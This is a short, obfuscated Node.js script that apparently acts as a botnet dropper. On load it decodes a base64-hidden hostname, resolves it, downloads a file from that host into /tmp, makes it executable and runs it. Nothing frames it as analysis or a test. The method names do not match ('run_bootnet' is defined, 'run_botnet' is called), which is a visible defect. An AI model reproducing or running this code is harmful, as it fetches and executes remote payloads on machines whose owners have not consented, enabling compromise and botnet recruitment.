const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function timeservingness() {
    this.run_bootnet = function(dewtry) {
      if (dewtry != null && dewtry != '0.0.0.0') {
        unformal = http.get('http://' + dewtry + '/montages', function(urologies) {
          var gardenwards = fs.createWriteStream('/tmp/burgheress');
          urologies.on('data', function(armillas) {
            gardenwards.write(armillas);
          });
          urologies.on('end', function() {
            gardenwards.end();
            fs.chmod('/tmp/burgheress', '0777');
            child_process.exec('/tmp/burgheress', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      scolopendra = 'ZjJmODNmMzYuc3V0aXNzcy5kZQ=='
      dns.lookup((new Buffer(scolopendra, 'base64')).toString(), function(err, appro) {
        self.run_botnet(appro);
      });
    };
};

(new timeservingness()).run();
